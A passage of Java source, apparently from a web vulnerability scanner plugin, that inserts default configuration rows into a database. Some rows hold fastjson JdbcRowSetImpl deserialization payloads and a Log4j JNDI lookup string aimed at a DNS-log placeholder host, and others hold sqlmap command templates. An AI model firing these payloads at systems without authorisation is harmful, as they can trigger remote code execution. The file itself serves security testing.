            sqls.add("INSERT INTO \"fastjson\" VALUES (25, 'jndi', '{\"bbbbbb\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"FUZZ\", \"autoCommit\":true}}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (26, 'jndi', '{\"bbbbbb\":{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"FUZZ\", \"autoCommit\":true}}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (27, 'version', '[\"a\"]');");
            sqls.add("INSERT INTO \"config\" VALUES (17, 'log4j', 'log4jHeader', 'X-Remote-Addr');");
            sqls.add("INSERT INTO \"config\" VALUES (18, 'log4j', 'log4jPayload', '${jndi:ldap://dnslog-url/}');");
            sqls.add("INSERT INTO \"config\" VALUES (78, 'sql', 'sqlWhiteSqlDomain', 'sql.com');");
            sqls.add("INSERT INTO \"config\" VALUES (79, 'sql', 'sqlErrorKey', 'mysql error');");
            sqls.add("INSERT INTO \"config\" VALUES (94, 'sql', 'sqlWhiteCheckBox', 'false');");
            sqls.add("INSERT INTO \"config\" VALUES (101, 'sql', 'sqlDeleteOrginCheckBox', 'false');");
            sqls.add("INSERT INTO \"config\" VALUES (105, 'config', 'ip', '1.1.1.1');");
            sqls.add("INSERT INTO \"config\" VALUES (106, 'tool', 'sqlmap', 'python sqlmap.py -r {request} -u {url} -h {host}');");
            sqls.add("INSERT INTO \"config\" VALUES (107, 'tool', 'sqlmapasd', 'python sqlmap.py -r {request} -u {url} -h {host}');");
            sqls.add("INSERT INTO \"config\" VALUES (108, 'tool', 'sqlmapasdaaa', 'python sqlmap.py -r {request} -u {url} -h {host}');");
            sqls.add("INSERT INTO \"config\" VALUES (112, 'perm', 'permWhiteDomain', '192.168.11.9:8980');");
            sqls.add("INSERT INTO \"config\" VALUES (115, 'perm', 'permWhiteDomainCheckBox', 'false');");
            sqls.add("INSERT INTO \"config\" VALUES (127, 'log4j', 'log4jDnsIpCheckBox', 'true');");
            sqls.add("INSERT INTO \"config\" VALUES (134, 'log4j', 'log4jWhiteDomain', 'www.baidu.com');");
            sqls.add("INSERT INTO \"config\" VALUES (136, 'log4j', 'log4jWhiteDomainCheckBox', 'false');");
            sqls.add("INSERT INTO \"config\" VALUES (145, 'sql', 'sqlCheckCookieCheckBox', 'false');");
            sqls.add("INSERT INTO \"config\" VALUES (146, 'sql', 'sqlPassiveScanCheckBox', 'false');");
            sqls.add("INSERT INTO \"config\" VALUES (148, 'perm', 'permLowAuth', 'Cookie: JSESSIONID=asd');");
            sqls.add("INSERT INTO \"config\" VALUES (149, 'perm', 'permNoAuth', 'Cookie');");
            sqls.add("INSERT INTO \"config\" VALUES (150, 'perm', 'permPassiveScanBox', 'false');");
            sqls.add("INSERT INTO \"config\" VALUES (151, 'log4j', 'log4jPassiveScanBox', 'false');");
            sqls.add("INSERT INTO \"config\" VALUES (158, 'log4j', 'log4jOrgPayloadCheckBox', 'false');");
            sqls.add("INSERT INTO \"config\" VALUES (160, 'log4j', 'log4jHeaderCheckBox', 'false');");
            sqls.add("INSERT INTO \"config\" VALUES (161, 'log4j', 'log4jParamCheckBox', 'false');");
            sqls.add("INSERT INTO \"config\" VALUES (162, 'config', 'dnslog', 'asd.com');");


            // 创建表
            for (String sql : sqls) {
                Statement statement = connection.createStatement();
                statement.execute(sql);
                statement.close();
            }
        } catch (SQLException e) {
            System.out.println(e.getMessage());
            Utils.stderr.println(e.getMessage());
        }
    }


    public static void close(Connection connection, PreparedStatement preparedStatement, ResultSet resultSet) {
        try {
            if (connection != null) {
                connection.close();
            }
            if (preparedStatement != null) {
                preparedStatement.close();
            }
            if (resultSet != null) {
                resultSet.close();
            }
        } catch (Exception e) {
            Utils.stderr.println(e.getMessage());
        }
    }

}
